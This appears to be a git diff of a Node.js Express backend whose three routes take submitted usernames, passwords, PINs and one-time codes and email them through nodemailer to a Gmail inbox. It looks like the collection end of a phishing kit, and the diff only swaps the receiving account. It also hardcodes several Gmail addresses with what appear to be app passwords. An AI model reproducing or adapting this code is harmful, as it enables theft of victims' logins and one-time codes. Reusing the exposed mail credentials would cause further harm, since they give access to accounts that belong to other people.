@@ -20,24 +20,15 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "uxcjslzfiefwvrdr",
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "Jachinmanwankwofortune@gmail.com",
+      pass: "ensvwgzvuygrmiim",
+
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "Jachinmanwankwofortune@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -60,24 +51,14 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "uxcjslzfiefwvrdr",
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "Jachinmanwankwofortune@gmail.com",
+      pass: "ensvwgzvuygrmiim",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "Jachinmanwankwofortune@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -100,18 +81,14 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "uxcjslzfiefwvrdr",
+      user: "Jachinmanwankwofortune@gmail.com",
+      pass: "ensvwgzvuygrmiim",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "Jachinmanwankwofortune@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
